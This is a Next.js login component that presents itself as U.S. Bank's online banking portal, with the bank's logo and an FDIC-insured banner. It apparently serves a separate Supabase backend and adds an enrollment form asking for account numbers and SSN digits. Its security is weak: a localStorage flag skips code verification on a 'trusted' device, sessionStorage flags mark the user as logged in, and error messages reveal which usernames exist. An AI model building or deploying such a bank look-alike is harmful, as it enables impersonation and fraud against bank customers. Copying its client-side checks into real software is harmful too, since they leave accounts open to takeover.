'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { supabase } from '../../lib/supabaseClient';

const BrandLogo = ({ size = 32, textColor = "#ffffff" }) => (
  <svg xmlns="http://www.w3.org/2000/svg" height={size} viewBox="0 0 1551 431">
    <g fill={textColor}>
      <g fillRule="evenodd">
        <path d="M1538.1 269.5c2.3 1 4.5 2.4 6.3 4.2s3.2 3.9 4.2 6.3 1.5 4.9 1.5 7.5c0 7.8-4.7 14.9-12 18-7.3 3-15.7 1.4-21.3-4.2-5.5-5.6-7.2-13.9-4.2-21.2s10.1-12 18-12c2.5-.1 5.1.4 7.5 1.4m-7.5 34.8c2.2 0 4.4-.4 6.5-1.3s3.9-2.1 5.5-3.7 2.8-3.5 3.6-5.6 1.2-4.3 1.1-6.5c0-6.9-4.1-13-10.4-15.6s-13.6-1.1-18.4 3.7-6.2 12.1-3.6 18.4c2.7 6.3 8.9 10.3 15.7 10.3zM579 0h66v106l3.3-3.6c1.7-2 5.7-5.3 8.7-7.3s9.1-5.2 13.5-7 12.4-4.2 17.8-5.2c5.3-1.1 14.1-1.9 19.4-1.9 5.4 0 13.7.7 18.6 1.5 4.8.8 12.4 2.8 16.9 4.3 4.6 1.5 11.7 4.8 15.8 7.2s10.1 6.6 13.3 9.2c3.1 2.6 8.5 8.3 11.8 12.6 3.4 4.2 7.6 10.4 9.5 13.7 1.8 3.3 4.5 8.9 6 12.5 1.4 3.6 3.7 10.8 5 16s3.1 16 4 24c1.4 13.2 1.4 15.6 0 27-.9 6.9-2.4 15.9-3.5 20-1 4.1-3.3 11.1-5.1 15.5-1.7 4.4-4.9 10.9-7 14.5-2 3.6-6.6 10.1-10.1 14.4-3.5 4.4-9.5 10.5-13.4 13.6-3.9 3-10.4 7.4-14.5 9.7s-11.5 5.5-16.5 7.1-12.6 3.5-17 4.2c-5.2.9-12.4 1.1-20.5.7-6.9-.3-15.2-1.3-18.5-2.2s-9.4-3.2-13.5-5.1-9.8-5.2-12.5-7.4c-2.8-2.1-6.7-6-12.6-13.5l.1 23.5h-65zm102 143.1c-3 .6-8.2 2.5-11.4 4.3-3.3 1.7-8.2 5.4-11 8.2s-6.6 8-8.3 11.5c-1.8 3.5-3.9 9.6-4.8 13.4-.8 3.9-1.5 10.4-1.5 14.5s.7 10.7 1.5 14.5c.8 3.9 2.8 9.7 4.3 13 1.6 3.3 5.1 8.5 7.9 11.5 2.7 3 7.7 6.9 10.9 8.7 3.2 1.7 8.6 3.9 11.9 4.7 3.3.9 9.1 1.6 13 1.6s9.7-.7 13-1.6c3.3-.8 8.6-3 11.9-4.7 3.2-1.8 7.8-5.2 10.1-7.7s5.6-7.3 7.3-10.7c1.8-3.5 3.9-9.1 4.7-12.5.8-3.5 1.5-11 1.5-16.8 0-6.3-.6-12.9-1.5-16.5-.9-3.3-2.7-8.5-4.1-11.5-1.5-3-5-8-7.9-11s-7.9-6.9-11.1-8.7c-3.3-1.7-7.7-3.6-9.9-4.1-2.2-.6-6.7-1.2-10-1.5-3.3-.2-7.1-.3-8.5-.1s-5 .9-8 1.5M921 79.1c3.6-.1 11.7.6 18 1.4s15.1 2.4 19.5 3.5 12.5 4.2 18 6.9c7.3 3.6 12 6.7 17.4 11.8 4 3.7 9 9.3 11 12.3s5.1 8.9 6.8 13 3.9 10.9 4.9 15c1.5 6.6 1.8 16.9 2.4 82 .4 41 1 75.7 2 80h-30c-27.7 0-30-.1-30.6-1.7-.3-1-.8-6-1.2-11.1-.4-5-.8-9.2-.9-9.2s-3.7 3.5-8 7.8c-5.1 5.1-10.2 9-14.8 11.4-3.9 2-11.4 4.8-16.7 6.2-7.8 2.1-12.1 2.6-21 2.6-7.2 0-14.4-.7-19.8-1.9-4.7-1-11.9-3.3-16-5s-10.6-5.5-14.4-8.4c-3.8-2.8-9-7.7-11.4-10.7-2.5-3-6.2-9.1-8.3-13.5-2-4.4-4.2-10.7-4.8-14s-1.1-9.6-1.1-14c0-4.5.8-11.2 1.9-15.5 1-4.1 2.8-9.3 3.9-11.5s3.8-6.5 6.1-9.5 6.7-7.7 9.9-10.3c3.1-2.7 9.7-6.8 14.7-9.2s12.8-5.3 17.5-6.4 20.6-3.9 35.5-6.2 29.2-4.9 32-5.8c3.6-1.2 5.6-2.6 7.3-5.1 1.6-2.6 2.2-4.8 2.1-8.4-.1-2.8-1.1-6.7-2.5-9.5-1.3-2.5-3.7-5.6-5.4-6.8-1.6-1.3-5.1-3.1-7.7-4.2-2.7-1-8.6-2.1-13.3-2.5-6.3-.5-9.8-.3-13.5.8-2.7.8-7.5 3-10.5 4.8-4 2.4-6.7 5.1-9.8 9.8-2.4 3.6-4.5 8.1-4.8 10s-.8 4.1-1.2 4.8c-.6 1.1-6.4.2-28.7-4.4-15.4-3.1-28.5-6.1-29-6.5-.7-.6-.4-3.6.9-8.7 1.1-4.2 3.9-11.8 6.4-16.7 3.8-7.6 6.1-10.6 14.6-19 6.9-6.8 12.5-11.3 17.6-14.2 4.1-2.3 12.2-5.8 18-7.7s15-4.2 20.5-4.9c5.5-.8 12.9-1.5 16.5-1.6m-20.9 140.7c-3.4 1.7-6.5 4.3-8.5 7.1-2.4 3.3-3.2 5.6-3.5 10-.1 3.1.3 7.6 1 10.1.8 2.7 2.9 6 5.1 8.2 2.6 2.6 5.6 4.3 9.6 5.4 4 1.2 8 1.5 13.2 1.2 4.1-.3 10-1.5 13-2.6 3-1.2 7.3-3.5 9.5-5.2s5.3-5 6.8-7.3 3.6-6.9 4.6-10.2c1.1-3.4 2.1-10.5 2.3-16.3l.5-10.2c-5.6.2-16.4 1.7-27.7 3.6-15.9 2.6-21.7 4-25.9 6.2"/>
      </g>
      <path d="M1157.5 81.9c-4.4 1-10.9 3-14.5 4.5-3.6 1.4-8.9 4.1-11.8 5.9-3 1.7-8.3 6.2-11.8 9.9-3.5 3.8-6.6 6.5-6.9 6-.3-.4-.5-5.5-.5-11.5V86h-63.5c-1.2 84.1-1.5 133.4-1.5 163.8V305l67.5-.5c.9-128.1 1.2-137.5 2.6-141 .9-2.2 2.8-5.8 4.2-8 1.5-2.2 4.2-5.2 6.2-6.8 1.9-1.5 5.6-3.6 8.3-4.8 2.6-1.1 7.6-2.3 11.2-2.6 3.9-.4 9.1-.1 13 .8 3.8.8 8.4 2.6 11 4.4 2.4 1.6 5.9 5 7.8 7.5 1.8 2.5 4.1 6.7 5 9.5 1.4 4.4 1.7 13.4 2.2 73l.5 68 66.5.5c0-119.3-.4-147.6-1.1-152.3-.6-3.9-1.9-10.8-3-15.2s-4.1-12.3-6.6-17.5c-3.8-8-5.9-10.9-13.2-18.1-6.9-6.9-10.3-9.4-17.1-12.8-4.7-2.2-12.1-5-16.5-6.2-4.9-1.3-12.3-2.2-19-2.5-8.3-.3-13 .1-19 1.5M1282.8 152.5l-.3 152.5 67-.5.5-54c15.5-17.1 20.3-22.1 20.7-22.2.5-.1 12.3 17 26.3 38l25.5 38.2c62 .4 80.3.1 80.6-.3s-18.9-28.9-42.7-63.5L1417 178c65.1-69.8 84-90.5 84-91 0-.7-14.8-1-42.5-1H1416l-65.5 72.2L1350 0h-67z"/>
    </g>
    <path fill="#cf2a36" d="M1 163.3v163.2C202.9 407.6 262.2 431 263 430.7c.8-.2 58.9-23.5 129-51.7s128.3-51.6 129.3-52.1c1.6-.9 1.7-9.7 1.7-163.9V0H1z"/>
    <g fill="#fff">
      <path d="M57.3 161.8c.3 67.4.6 76.5 2.1 83.2 1 4.1 2.9 10.4 4.3 14s4.4 9.6 6.6 13.5c2.3 3.9 7.1 10 10.7 13.6s9.2 8.3 12.5 10.4 9.2 5 13 6.6c3.8 1.5 10.5 3.5 14.8 4.3 4.5 1 12.7 1.6 20 1.6 8.8 0 14.5-.6 20.7-2.1 4.7-1.1 11.9-3.6 16-5.6 5.2-2.5 9.6-5.7 14.2-10.2l6.6-6.6c.9 13.6 1.4 18.2 1.7 19 .4 1.3 4.8 1.5 32.8 1.2 20.8-.1 32.1-.6 32-1.2s-.7-9.6-1.2-20c-.6-10.6-1.1-58.3-1.1-108.3V86h-67.2l-.3 133.5c-3.9 9.8-6.7 14-9.9 17.3-3 3-7.2 6.2-10.1 7.4-3.5 1.5-7.8 2.3-14 2.6-7.5.3-10 0-15-1.8-4.2-1.6-7.6-3.8-11.1-7.4q-5.1-5.1-7.5-11.1l-2.4-6L125 86H56.9zM360.5 80.9c-5.5 1-13.6 3.2-18 4.9s-11.4 5.3-15.5 8-10.7 8.2-14.5 12.3c-4.1 4.3-8.5 10.3-10.6 14.4-2 3.8-4.5 9.5-5.5 12.5-1.5 4.3-1.9 8.4-1.9 19 0 11.3.4 14.6 2.2 20.2 1.3 3.8 3.8 9.4 5.7 12.5 1.8 3.2 6.6 8.8 10.5 12.5 3.9 3.8 10.4 8.6 14.3 10.8 4 2.2 11.4 5.3 16.3 6.9s17.6 5 28 7.6c10.4 2.5 20.8 5.4 23 6.4s5.3 3.1 6.8 4.7q2.8 2.9 3.4 7.4c.4 2.9.1 5.7-.8 7.9-.8 1.9-3.2 4.9-5.4 6.8-2.2 1.8-5.8 3.8-8 4.4s-8.1.9-13 .7c-6.9-.3-10.1-.9-14-2.8-2.8-1.4-6.6-4-8.5-6-1.9-1.9-4.4-5.3-5.4-7.5s-2.2-5.7-2.5-7.9c-.3-2.1-.8-4-1.1-4.1-.3-.2-12.8 1.9-27.8 4.6-14.9 2.7-27.6 4.9-28.2 4.9s-1 1.2-1 2.7c0 1.6.7 5.3 1.5 8.3s2.4 7.7 3.6 10.5c1.2 2.7 3.6 7.2 5.4 10 1.8 2.7 5.4 7.4 8.1 10.4s7.1 7.1 9.9 9.1c2.7 2 6.8 4.6 9 5.9s7.4 3.7 11.5 5.3 10.2 3.6 13.5 4.3c3.3.8 11.4 1.9 18 2.5 8.4.7 15.1.7 22.5 0 5.8-.6 14.1-2 18.5-3.1 4.4-1 12.1-3.9 17-6.3s11.7-6.6 15-9.2c3.2-2.7 8.1-7.6 10.7-10.9 2.7-3.3 6.1-8.7 7.7-12s3.6-8 4.4-10.5c.9-2.5 2-8.2 2.6-12.8.8-5.6.8-10.6.1-16-.6-4.2-1.7-10-2.6-12.7-.9-2.8-2.6-6.8-3.7-9s-3.9-6.5-6.2-9.5-6.6-7.5-9.6-10c-2.9-2.5-8.7-6.4-12.9-8.7-4.1-2.4-11.6-5.6-16.5-7.2s-18-4.8-29-7.1-21.7-5.1-23.8-6.1c-2-1.1-4.5-3.1-5.6-4.7-1-1.5-2.1-4.1-2.4-5.7-.3-1.7-.2-4.6.3-6.5.5-2.1 2.7-5.2 5.4-7.8 2.8-2.6 6.2-4.6 8.8-5.3 2.4-.6 6.8-1.1 9.8-1.1 3-.1 7.7.6 10.5 1.5 2.7.9 6.8 3.2 9 5s5.2 5.8 6.8 8.8c1.5 3 2.7 6.4 2.7 7.6 0 1.3.4 2.5 1 2.8s12.4-1.5 26.2-4c13.9-2.5 26.3-4.7 27.5-5 2-.4 2.2-1 1.7-3.8-.3-1.7-1.7-7-3.2-11.7-1.6-5.2-4.4-11.2-7.3-15.5-2.5-3.9-7.7-9.9-11.5-13.4-5.1-4.6-9.8-7.7-17.9-11.7-8-3.9-13.7-5.9-21-7.3-5.5-1.2-15.4-2.3-22-2.6-9.2-.4-14.4 0-22 1.4"/>
    </g>
  </svg>
);

export default function ClientLogin() {
  // 'password' | 'otp_request' | 'otp_verify' | 'enroll'
  const [loginMode, setLoginMode] = useState('password'); 
  
  // Login State
  const [usernameInput, setUsernameInput] = useState(''); 
  const [password, setPassword] = useState('');
  const [otpToken, setOtpToken] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [rememberMe, setRememberMe] = useState(false);
  
  // Background State for OTP translation
  const [resolvedEmail, setResolvedEmail] = useState('');
  const [resolvedName, setResolvedName] = useState('Member');

  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const router = useRouter();

  // Enrollment State
  const [enrollAccount, setEnrollAccount] = useState('');
  const [enrollSSN, setEnrollSSN] = useState('');
  const [showEnrollAccount, setShowEnrollAccount] = useState(false);
  const [showEnrollSSN, setShowEnrollSSN] = useState(false);

  // Load remembered username on startup
  useEffect(() => {
    const savedUsername = localStorage.getItem('remembered_username');
    if (savedUsername) {
      setUsernameInput(savedUsername);
      setRememberMe(true);
    }
  }, []);

  // HELPER: Translate Username to Email & Get Full Name
  const lookupUserCredentials = async (input) => {
    let email = input.trim();
    let fullName = 'Member';
    const isEmail = email.includes('@');

    let query = supabase.from('profiles').select('email, full_name');
    if (isEmail) query = query.eq('email', email);
    else query = query.eq('username', email);

    const { data: profile, error } = await query.single();
    
    if (error && !isEmail) {
      return { error: `Username not found. Please verify your details.` };
    }

    if (profile) {
      email = profile.email;
      if (profile.full_name) fullName = profile.full_name;
    }

    return { email, fullName };
  };

  // FLOW 1: SMART PASSWORD LOGIN (Checks for First-Time / New Device)
  const handlePasswordLogin = async (e) => {
    e.preventDefault();
    setIsLoading(true); setError('');

    if (!usernameInput || !password) {
      setError('Please enter your username/email and password.');
      setIsLoading(false); return;
    }

    const { email, fullName, error: lookupErr } = await lookupUserCredentials(usernameInput);
    if (lookupErr) { setError(lookupErr); setIsLoading(false); return; }

    const { data, error: authErr } = await supabase.auth.signInWithPassword({ email, password });

    if (authErr) {
      setError('Invalid credentials. Please try again.');
      setIsLoading(false); return;
    }

    // Fetch the exact name now that the user is securely authenticated 
    let finalFullName = fullName;
    const { data: authProfile } = await supabase.from('profiles').select('full_name').eq('email', email).single();
    if (authProfile && authProfile.full_name) {
      finalFullName = authProfile.full_name;
    }

    if (rememberMe) localStorage.setItem('remembered_username', usernameInput);
    else localStorage.removeItem('remembered_username');

    // SECURITY CHECK: Is this their first time logging in on this device?
    const isTrustedDevice = localStorage.getItem(`device_trusted_${email}`);

    if (isTrustedDevice === 'true') {
      // DEVICE RECOGNIZED: Let them straight in!
      sessionStorage.setItem('client_authenticated', 'true');
      sessionStorage.setItem('current_user', email);
      sessionStorage.setItem('display_name', finalFullName);
      window.location.href = '/client';
    } else {
      // FIRST TIME LOGIN: Force the secure email code
      await supabase.auth.signOut(); // Instantly lock the vault back up
      setResolvedEmail(email);
      setResolvedName(finalFullName);

      const { error: otpError } = await supabase.auth.signInWithOtp({
        email: email,
        options: { shouldCreateUser: false }
      });

      if (otpError) {
        setError('Error dispatching secure code. Please contact support.');
        setIsLoading(false); return;
      }

      setLoginMode('otp_verify'); 
      setIsLoading(false);
    }
  };

  // FLOW 2: FORGOT PASSWORD -> REQUEST OTP
  const handleOtpRequest = async (e) => {
    e.preventDefault();
    setIsLoading(true); setError('');

    if (!usernameInput) {
      setError('Please enter your Username or Email first.');
      setIsLoading(false); return;
    }

    const { email, fullName, error: lookupErr } = await lookupUserCredentials(usernameInput);
    if (lookupErr) { setError(lookupErr); setIsLoading(false); return; }

    setResolvedEmail(email);
    setResolvedName(fullName);

    const { error: otpError } = await supabase.auth.signInWithOtp({
      email: email,
      options: { shouldCreateUser: false }
    });

    if (otpError) {
      setError('Error dispatching secure code. Please contact support.');
    } else {
      setLoginMode('otp_verify'); 
    }
    setIsLoading(false);
  };

  // FLOW 3: VERIFY OTP AND TRUST DEVICE
  const handleOtpVerify = async (e) => {
    e.preventDefault();
    setIsLoading(true); setError('');

    if (!otpToken || otpToken.length < 6) {
      setError('Please enter the full secure code sent to your email.');
      setIsLoading(false); return;
    }

    const { data, error } = await supabase.auth.verifyOtp({
      email: resolvedEmail, 
      token: otpToken,
      type: 'email'
    });

    if (error) {
      setError('Invalid or expired code. Please try again.');
      setIsLoading(false); return;
    }

    // Fetch the exact name now that the OTP verified their identity 
    let finalFullName = resolvedName;
    const { data: authProfile } = await supabase.from('profiles').select('full_name').eq('email', resolvedEmail).single();
    if (authProfile && authProfile.full_name) {
      finalFullName = authProfile.full_name;
    }

    if (rememberMe) localStorage.setItem('remembered_username', usernameInput);
    else localStorage.removeItem('remembered_username');

    // MARK THIS DEVICE AS TRUSTED FOR NEXT TIME!
    localStorage.setItem(`device_trusted_${resolvedEmail}`, 'true');

    if (data.session) {
      sessionStorage.setItem('client_authenticated', 'true');
      sessionStorage.setItem('current_user', resolvedEmail);
      sessionStorage.setItem('display_name', finalFullName);
      window.location.href = '/client';
    }
  };

  // FLOW 4: ENROLLMENT MOCK SUBMIT
  const handleEnrollSubmit = (e) => {
    e.preventDefault();
    setIsLoading(true); setError('');
    
    if (!enrollAccount || !enrollSSN) {
      setError('Please fill out all required fields to continue.');
      setIsLoading(false); return;
    }

    setTimeout(() => {
      setError('Account verification pending. Please contact your Wealth Manager to finalize enrollment.');
      setIsLoading(false);
    }, 1500);
  };

  const styles = `
    * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    body { background-color: white; margin: 0; padding: 0; color: #1f2937; -webkit-font-smoothing: antialiased; }
    
    .login-top-nav { background-color: #0c2074; color: white; display: flex; justify-content: space-between; align-items: center; padding: 12px 40px; }
    
    .logo-wrapper { display: flex; align-items: center; }

    .login-container { max-width: 1000px; margin: 40px auto; padding: 0 20px; }
    .enroll-container { max-width: 750px; margin: 40px auto; padding: 0 20px; }

    .fdic-banner { border: 1px solid #e5e7eb; border-radius: 6px; padding: 16px 20px; display: flex; align-items: center; gap: 12px; margin-bottom: 40px; font-size: 14px; color: #1f2937; }
    .fdic-bold { font-weight: 800; font-size: 16px; color: #0c2074; letter-spacing: -0.5px; }
    .fdic-italic { font-style: italic; color: #4b5563; }

    .login-grid { display: grid; grid-template-columns: 5fr 4fr; gap: 80px; align-items: start; }

    h1 { font-size: 24px; font-weight: 700; color: #1f2937; margin: 0 0 32px 0; }
    
    .input-group { margin-bottom: 32px; position: relative; width: 100%; }
    .floating-label { display: block; font-size: 16px; color: #4b5563; margin-bottom: 4px; }
    .clean-input { width: 100%; border: none; border-bottom: 1px solid #9ca3af; padding: 8px 0; font-size: 16px; color: #1f2937; outline: none; transition: border-color 0.2s; background: transparent; }
    .clean-input:focus { border-bottom: 2px solid #1d4ed8; padding-bottom: 7px; }
    
    .show-toggle { position: absolute; right: 0; bottom: 8px; background: none; border: none; color: #4b5563; font-size: 14px; font-weight: 500; cursor: pointer; padding: 0; }
    .show-toggle:hover { color: #1d4ed8; text-decoration: underline; }

    .checkbox-row { display: flex; align-items: center; gap: 12px; margin-top: -16px; margin-bottom: 32px; }
    .checkbox-row input[type="checkbox"] { width: 18px; height: 18px; cursor: pointer; border: 1px solid #9ca3af; border-radius: 4px; }
    .checkbox-row label { font-size: 16px; color: #4b5563; cursor: pointer; }

    .error-msg { background: #fee2e2; color: #991b1b; padding: 12px 16px; border-radius: 4px; margin-bottom: 24px; font-size: 14px; font-weight: 500; border-left: 4px solid #ef4444; }
    .success-msg { background: #dcfce7; color: #166534; padding: 12px 16px; border-radius: 4px; margin-bottom: 24px; font-size: 14px; font-weight: 500; border-left: 4px solid #22c55e; }

    .btn-solid { width: 100%; background-color: #2563eb; color: white; border: none; padding: 14px; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background-color 0.2s; display: flex; justify-content: center; align-items: center; gap: 8px; }
    .btn-solid:hover { background-color: #1d4ed8; }
    .btn-solid:disabled { background-color: #9ca3af; cursor: not-allowed; }

    .divider { display: flex; align-items: center; text-align: center; margin: 24px 0; color: #6b7280; font-size: 14px; font-weight: 600; }
    .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #d1d5db; }
    .divider::before { margin-right: 16px; }
    .divider::after { margin-left: 16px; }

    .btn-outline { width: 100%; background-color: transparent; color: #2563eb; border: 1px solid #2563eb; padding: 14px; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background-color 0.2s; display: flex; justify-content: center; align-items: center; gap: 10px; }
    .btn-outline:hover { background-color: #eff6ff; }
    
    .forgot-btn { background: none; border: none; padding: 0; color: #2563eb; font-size: 16px; font-weight: 600; cursor: pointer; display: flex; align-items: center; gap: 4px; margin-top: 32px; }
    .forgot-btn:hover { text-decoration: underline; }

    .passkey-card { background-color: #f8fafc; border-radius: 12px; padding: 40px; }
    .passkey-title { font-size: 22px; font-weight: 700; color: #1f2937; margin: 24px 0 16px 0; letter-spacing: -0.5px; }
    .passkey-desc { font-size: 16px; color: #4b5563; line-height: 1.6; margin-bottom: 24px; }
    .learn-more { color: #2563eb; font-weight: 600; font-size: 16px; cursor: pointer; display: inline-flex; align-items: center; gap: 4px; text-decoration: none; }
    .learn-more:hover { text-decoration: underline; }

    /* Enrollment Specific Styles */
    .enroll-header { font-size: 32px; font-weight: 700; color: #1f2937; margin: 0 0 16px 0; letter-spacing: -0.5px; }
    .enroll-subheader { font-size: 20px; font-weight: 600; color: #1f2937; margin: 0 0 24px 0; }
    .enroll-text { font-size: 16px; color: #4b5563; margin-bottom: 16px; line-height: 1.5; }
    .enroll-cancel-btn { background: none; border: none; color: #2563eb; font-size: 16px; font-weight: 600; cursor: pointer; padding: 12px; }
    .enroll-cancel-btn:hover { text-decoration: underline; }

    @media (max-width: 900px) {
      .login-grid { grid-template-columns: 1fr; gap: 48px; }
      /* Modified for mobile: Add specific padding and a slight top margin to nudge the logo down */
      .login-top-nav { padding: 24px 20px 16px 20px; flex-direction: column; gap: 16px; align-items: flex-start; }
      .logo-wrapper { margin-top: 6px; }
    }
  `;

  return (
    <>
      <style dangerouslySetInnerHTML={{ __html: styles }} />
      
      {/* HEADER: Original dark blue background with SVG Logo and empty right side */}
      <header className="login-top-nav">
        <div className="logo-wrapper">
          <BrandLogo size={32} textColor="#ffffff" />
        </div>
        <div className="nav-links">
          {/* Customer Service and Locations removed */}
        </div>
      </header>

      {/* --- STANDARD LOGIN VIEW --- */}
      {loginMode !== 'enroll' && (
        <main className="login-container">
          <div className="fdic-banner">
            <span className="fdic-bold">FDIC</span>
            <span className="fdic-italic">FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
          </div>

          <div className="login-grid">
            
            {/* DYNAMIC LEFT COLUMN */}
            <div>
              <h1>Account login</h1>
              {error && <div className="error-msg">{error}</div>}

              {/* STEP 1: PASSWORD LOGIN */}
              {loginMode === 'password' && (
                <form onSubmit={handlePasswordLogin}>
                  <div className="input-group">
                    <label className="floating-label">Username or Email</label>
                    <input type="text" className="clean-input" value={usernameInput} onChange={(e) => setUsernameInput(e.target.value)} disabled={isLoading} />
                  </div>

                  <div className="checkbox-row">
                    <input type="checkbox" id="remember" checked={rememberMe} onChange={(e) => setRememberMe(e.target.checked)} />
                    <label htmlFor="remember">Remember my username</label>
                  </div>

                  <div className="input-group">
                    <label className="floating-label">Password</label>
                    <input type={showPassword ? "text" : "password"} className="clean-input" value={password} onChange={(e) => setPassword(e.target.value)} disabled={isLoading} />
                    <button type="button" className="show-toggle" onClick={() => setShowPassword(!showPassword)} disabled={isLoading}>
                      {showPassword ? 'Hide' : 'Show'}
                    </button>
                  </div>
                  
                  <button type="submit" className="btn-solid" disabled={isLoading}>
                    {isLoading ? <><div className="spinner"></div> Authenticating...</> : 'Log in'}
                  </button>
                  
                  <button type="button" className="forgot-btn" onClick={() => setLoginMode('otp_request')} disabled={isLoading}>
                    Forgot password? Log in with a secure code <span>›</span>
                  </button>
                </form>
              )}

              {/* FORGOT PASSWORD -> OTP REQUEST */}
              {loginMode === 'otp_request' && (
                <form onSubmit={handleOtpRequest}>
                  <div style={{ marginBottom: '24px', fontSize: '15px', color: '#4b5563', lineHeight: 1.5 }}>
                    <strong>Forgot your password?</strong> Enter your Username or Email below. We will send a secure, single-use code to your inbox to log you in securely.
                  </div>
                  <div className="input-group">
                    <label className="floating-label">Username or Email</label>
                    <input type="text" className="clean-input" value={usernameInput} onChange={(e) => setUsernameInput(e.target.value)} disabled={isLoading} />
                  </div>

                  <button type="submit" className="btn-solid" disabled={isLoading}>
                    {isLoading ? <><div className="spinner"></div> Sending Secure Code...</> : 'Send Verification Code'}
                  </button>
                  <div className="divider">OR</div>
                  <button type="button" className="btn-outline" onClick={() => setLoginMode('password')} disabled={isLoading}>
                    Return to Password Login
                  </button>
                </form>
              )}

              {/* OTP VERIFICATION */}
              {loginMode === 'otp_verify' && (
                <form onSubmit={handleOtpVerify}>
                  <div className="success-msg">✓ For your security, we require email verification when logging in from a new device. A secure code has been sent to the registered email for {usernameInput}.</div>
                  <div className="input-group">
                    <label className="floating-label">Enter Secure Code</label>
                    <input 
                      type="text" 
                      maxLength={8} 
                      className="clean-input" 
                      value={otpToken} 
                      onChange={(e) => setOtpToken(e.target.value.replace(/[^0-9]/g, ''))} 
                      disabled={isLoading} 
                      placeholder="00000000" 
                      style={{ fontSize: '24px', letterSpacing: '4px', textAlign: 'center' }} 
                    />
                  </div>
                  <button type="submit" className="btn-solid" disabled={isLoading}>
                    {isLoading ? <><div className="spinner"></div> Authenticating...</> : 'Verify & Log In'}
                  </button>
                  <button type="button" className="forgot-btn" onClick={() => setLoginMode('password')} disabled={isLoading} style={{ justifyContent: 'center', width: '100%' }}>
                    Cancel & Return to Password Login
                  </button>
                </form>
              )}

              {/* ENROLLMENT CALL-TO-ACTION */}
              {(loginMode === 'password' || loginMode === 'otp_request') && (
                <div style={{ marginTop: '40px', paddingTop: '32px', borderTop: '1px solid #e5e7eb', textAlign: 'center' }}>
                  <p style={{ fontSize: '16px', color: '#4b5563', margin: '0 0 16px 0', fontWeight: '500' }}>New to U.S Bank Online Banking?</p>
                  <button type="button" className="btn-outline" onClick={() => setLoginMode('enroll')} disabled={isLoading}>
                    Enroll in online banking
                  </button>
                </div>
              )}

            </div>

            {/* RIGHT COLUMN */}
            <div>
              <div className="passkey-card">
                <svg width="80" height="80" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M32 8L12 16V30C12 43.08 20.52 55.22 32 60C43.48 55.22 52 43.08 52 30V16L32 8Z" fill="#eff6ff" stroke="#2563eb" strokeWidth="4" strokeLinejoin="round"/>
                  <path d="M24 32L29 37L40 25" stroke="#2563eb" strokeWidth="4" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
                <h2 className="passkey-title">Trusted Device Security</h2>
                <p className="passkey-desc">U.S Bank utilizes advanced device recognition. When logging in for the first time on a new computer or phone, we require a secure email verification code to confirm your identity and register the device as safe.</p>
                <a href="#" className="learn-more">Learn about our security <span>›</span></a>
              </div>
            </div>

          </div>
        </main>
      )}

      {/* --- ENROLLMENT VIEW --- */}
      {loginMode === 'enroll' && (
        <main className="enroll-container">
          <h1 className="enroll-header">Let's get started.</h1>
          <h2 className="enroll-subheader">Online and mobile banking enrollment</h2>

          <p className="enroll-text">
            We suggest enrolling using information from your checking or savings account, if you have one. If not, use a different type of account.
          </p>
          <p className="enroll-text" style={{ marginBottom: '40px' }}>
            <strong>Business account holders,</strong> be sure to enroll using your business account number so you have full access to our suite of robust business tools and capabilities.
          </p>

          {error && <div className="error-msg">{error}</div>}

          <form onSubmit={handleEnrollSubmit}>
            <div className="input-group">
              <label className="floating-label">Card or account number</label>
              <input 
                type={showEnrollAccount ? "text" : "password"} 
                className="clean-input" 
                value={enrollAccount} 
                onChange={(e) => setEnrollAccount(e.target.value.replace(/[^0-9]/g, ''))} 
                disabled={isLoading}
              />
              <button type="button" className="show-toggle" onClick={() => setShowEnrollAccount(!showEnrollAccount)} disabled={isLoading}>
                {showEnrollAccount ? 'Hide' : 'Show'}
              </button>
            </div>

            <div className="input-group">
              <label className="floating-label">Last 4 digits of SSN</label>
              <input 
                type={showEnrollSSN ? "text" : "password"} 
                maxLength={4} 
                className="clean-input" 
                value={enrollSSN} 
                onChange={(e) => setEnrollSSN(e.target.value.replace(/[^0-9]/g, ''))} 
                disabled={isLoading}
              />
              <button type="button" className="show-toggle" onClick={() => setShowEnrollSSN(!showEnrollSSN)} disabled={isLoading}>
                {showEnrollSSN ? 'Hide' : 'Show'}
              </button>
            </div>

            <a href="#" className="forgot-link" style={{ fontSize: '14px', margin: '0 0 40px 0', display: 'inline-block' }}>
              I don't have a Social Security number.
            </a>

            <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '16px', alignItems: 'center' }}>
              <button type="button" className="enroll-cancel-btn" onClick={() => setLoginMode('password')} disabled={isLoading}>
                Cancel
              </button>
              <button type="submit" className="btn-solid" style={{ width: 'auto', padding: '12px 32px' }} disabled={isLoading}>
                {isLoading ? 'Processing...' : 'Continue'}
              </button>
            </div>
          </form>
        </main>
      )}
    </>
  );
}